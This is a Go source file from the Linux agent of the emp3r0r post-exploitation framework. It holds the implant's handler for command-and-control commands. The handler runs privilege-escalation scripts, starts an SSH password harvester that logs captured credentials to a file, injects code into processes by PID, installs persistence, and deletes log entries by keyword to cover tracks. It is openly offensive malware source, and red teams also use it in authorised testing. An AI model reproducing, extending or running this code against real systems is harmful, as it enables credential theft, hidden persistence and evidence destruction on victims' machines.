//go:build linux
// +build linux

package agent

import (
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"strconv"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/pflag"
)

func platformC2CommandsHandler(cmdSlice []string) (out string) {
	var err error

	// parse command-line arguments using pflag
	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
	flags.Parse(cmdSlice[1:])

	switch cmdSlice[0] {

	case emp3r0r_def.C2CmdLPE:
		// Usage: !lpe --script_name <script_name>
		// Runs a Local Privilege Escalation (LPE) script.
		scriptName := flags.StringP("script_name", "s", "", "Script name")
		checksum := flags.StringP("checksum", "c", "", "Checksum")
		flags.Parse(cmdSlice[1:])
		if *scriptName == "" || *checksum == "" {
			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
			log.Printf("%s", out)
			return
		}
		out = runLPEHelper(*scriptName, *checksum)
		return

	case emp3r0r_def.C2CmdSSHHarvester:
		// Usage: !ssh_harvester
		// Starts monitoring SSH connections and logs passwords.
		code_pattern := flags.StringP("code_pattern", "p", "", "Code pattern")
		flags.Parse(cmdSlice[1:])
		code_pattern_bytes, err := hex.DecodeString(*code_pattern)
		if err != nil {
			out = fmt.Sprintf("Error parsing hex string: %v", err)
			return
		}

		passfile := fmt.Sprintf("%s/%s.txt",
			RuntimeConfig.AgentRoot, util.RandStr(10))
		out = fmt.Sprintf("Look for passwords in %s", passfile)
		go sshd_monitor(passfile, code_pattern_bytes)
		return

	// !inject --method method --pid pid
	case emp3r0r_def.C2CmdInject:
		// Usage: !inject --method <method> --pid <pid>
		// Injects code into the specified process using the specified method.
		method := flags.StringP("method", "m", "", "Injection method")
		pid := flags.StringP("pid", "p", "", "Process ID")
		checksum := flags.StringP("checksum", "c", "", "Checksum")
		flags.Parse(cmdSlice[1:])
		if *method == "" || *pid == "" || *checksum == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = fmt.Sprintf("%s: success", *method)
		pidInt, err := strconv.ParseInt(*pid, 10, 32)
		if err != nil {
			log.Print("Invalid pid")
		}
		err = InjectorHandler(int(pidInt), *method, *checksum)
		if err != nil {
			out = "Error: " + err.Error()
		}
		return

	// !persistence --method method
	case emp3r0r_def.C2CmdPersistence:
		// Usage: !persistence --method <method>
		// Sets up persistence using the specified method.
		method := flags.StringP("method", "m", "", "Persistence method")
		flags.Parse(cmdSlice[1:])
		if *method == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = "Success"
		if *method == "all" {
			err = PersistAllInOne()
			if err != nil {
				log.Print(err)
				out = fmt.Sprintf("Some has failed: %v", err)
			}
		} else {
			out = "Error: No such method available"
			if persistMethod, exists := PersistMethods[*method]; exists {
				out = "Success"
				err = persistMethod()
				if err != nil {
					log.Println(err)
					out = fmt.Sprintf("Error: %v", err)
				}
			}
		}
		return

	// !get_root
	case emp3r0r_def.C2CmdGetRoot:
		// Usage: !get_root
		// Attempts to gain root privileges.
		if os.Geteuid() == 0 {
			out = "Warning: You already have root!"
		} else {
			out = "Deprecated"
		}
		return

	// !clean_log --keyword keyword
	case emp3r0r_def.C2CmdCleanLog:
		// Usage: !clean_log --keyword <keyword>
		// Cleans logs containing the specified keyword.
		keyword := flags.StringP("keyword", "k", "", "Keyword to clean logs")
		flags.Parse(cmdSlice[1:])
		if *keyword == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = "Done"
		err = CleanAllByKeyword(*keyword)
		if err != nil {
			out = err.Error()
		}
		return
	}

	return fmt.Sprintf("Error: Unknown command %v", cmdSlice)
}
